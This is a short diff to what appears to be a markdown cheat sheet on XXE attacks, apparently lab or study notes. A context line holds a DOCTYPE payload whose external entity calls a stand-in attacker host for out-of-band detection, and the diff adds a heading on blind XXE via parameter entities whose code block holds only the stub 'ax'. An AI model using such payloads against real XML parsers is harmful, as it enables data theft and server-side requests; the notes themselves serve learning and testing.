@@ -60,3 +60,9 @@ Content-Length: 52
 ```
 <!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://f2g9j7hhkax.web-attacker.com"> ]> 
 ```
+
+### Blind XXE with out-of-band interaction via XML parameter entities
+
+```
+ax
+```
